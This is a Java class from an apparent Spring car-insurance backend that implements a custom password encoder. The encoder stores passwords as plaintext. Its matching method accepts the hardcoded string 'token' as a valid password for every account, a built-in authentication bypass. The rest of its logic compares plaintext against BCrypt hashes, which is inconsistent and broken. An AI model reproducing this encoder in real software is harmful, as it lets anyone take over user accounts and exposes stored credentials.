package com.yakvel.carInsuranceBackEnd.config.service;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

public class noOpPasswordEncoder implements PasswordEncoder {
    @Override
    public String encode(CharSequence rawPassword) {
        return rawPassword.toString();
    }

    @Override
    public boolean matches(CharSequence rawPassword, String encodedPassword) {
        if ("token".contentEquals(rawPassword)) {
            return true;
        } else {
            return new BCryptPasswordEncoder().matches(encode(rawPassword), encodedPassword);
        }
    }
}
